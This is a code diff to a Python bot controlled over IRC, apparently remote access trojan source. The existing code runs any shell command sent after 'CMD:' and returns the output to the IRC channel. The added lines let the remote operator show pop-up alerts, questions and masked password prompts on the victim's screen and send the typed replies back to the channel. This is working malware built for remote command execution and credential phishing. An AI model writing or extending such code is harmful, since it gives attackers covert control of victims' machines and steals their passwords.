@@ -2,7 +2,7 @@ import socket
 from cryptography import fernet
 from os import getcwd, chdir
 from subprocess import check_output,STDOUT
-from time import sleep
+from pymsgbox import alert,confirm,prompt,password
 from clipboard import paste , copy
 def clearBuffer(sock,time):
     sock.settimeout(time)
@@ -46,5 +46,24 @@ def processor(irc , server , channel , port , key , botnick):
                 elif "CMD:" in text :
                     out=check_output(text.split("CMD:")[-1],stderr=STDOUT,shell=True)
                     send(irc, out.decode())
+                elif "POPUP" in text:
+                    text = text.split(":")
+                    text=list(filter((" ").__ne__, text))
+                    text=list(filter(("  ").__ne__, text))
+                    if text[1]=="alert":
+                        alert(text[2],text[3])
+                        send(irc, "DONE :)")
+                    elif text[1]=="confr":
+                        lsButtons=text[4].split(',')
+                        resault=confirm(text=text[2], title=text[3], buttons=lsButtons)
+                        send(irc , resault)
+                    elif text[1]=="qstion":
+                        resault=prompt(text=text[2], title=text[3])
+                        send(irc , resault)
+                    elif text[1]=="passwd":
+                        resault=password(text=text[2], title=text[3], mask='*')
+                        send(irc , resault)
+                    else :
+                        send(irc , f"{text[1]} NOT FOUND :(")
         except Exception as err :
             send(irc, str(err))
